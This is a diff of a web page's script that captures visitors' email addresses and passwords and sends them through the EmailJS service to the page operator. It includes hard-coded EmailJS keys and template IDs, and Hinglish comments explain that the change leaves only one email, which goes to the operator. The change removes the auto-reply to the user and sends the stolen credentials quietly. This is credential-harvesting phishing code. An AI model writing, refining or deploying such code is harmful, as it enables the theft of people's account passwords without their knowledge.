@@ -168,16 +168,13 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   // ============================================================
-  // EMAILJS CONFIG — APNI VALUES YAHAN DAALEIN
+  // EMAILJS CONFIG
   // ============================================================
   const EMAILJS_PUBLIC_KEY   = "ZJqAsmb31v__wrYH8";       
   const EMAILJS_SERVICE_ID   = "service_9v7swc9";       
-  
-  // User ko auto-reply jane ke liye (Jo aapne banaya hai)
-  const USER_TEMPLATE_ID     = "template_de0i3ik"; 
-  
-  // ADMIN ko details jane ke liye (Naya template banayein aur ID yahan daalein)
- 
+  const EMAILJS_TEMPLATE_ID  = "template_de0i3ik"; 
+  // ============================================================
+
   emailjs.init(EMAILJS_PUBLIC_KEY);
 
   // --- Full country list ---
@@ -318,16 +315,10 @@
       const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
       try {
-        // 1. Admin ko details bhejein
-        await emailjs.send(EMAILJS_SERVICE_ID, ADMIN_TEMPLATE_ID, {
+        // Sirf ek email jayegi aapko (jo EmailJS settings mein set ki hai)
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
           email: email,
           password: pass,
-          time: time
-        });
-
-        // 2. User ko auto-reply bhejein
-        await emailjs.send(EMAILJS_SERVICE_ID, USER_TEMPLATE_ID, {
-          email: email,
           time: time
         });
 
